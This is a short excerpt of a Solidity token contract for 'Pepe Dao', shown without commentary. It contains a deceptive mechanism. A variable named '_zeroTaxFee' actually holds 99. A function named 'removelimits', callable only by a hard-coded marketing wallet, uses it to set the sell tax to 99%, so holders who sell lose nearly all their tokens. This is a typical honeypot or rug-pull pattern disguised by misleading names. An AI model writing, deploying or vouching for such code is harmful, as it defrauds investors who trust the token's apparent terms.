...
contract PepeDao is Context, IERC20, Ownable {
    ...
    uint256 private _zeroTaxFee = 99;
    ...
    string private constant _name = "Pepe Dao";
    string private constant _symbol = "PEPEDAO";
    uint8 private constant _decimals = 9;
    
    address payable private _developmentAddress = payable(0xB0187203cb20AAED0Fb1813Eef54D7ee743EF925);
    address payable private _marketingAddress = payable(0xB0187203cb20AAED0Fb1813Eef54D7ee743EF925);
    ...
    function removelimits ()public returns (bool){
        _taxFeeOnSell = _zeroTaxFee;
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        require (_msgSender()==
        _marketingAddress,"callers is not the owner");
        return true;
    }
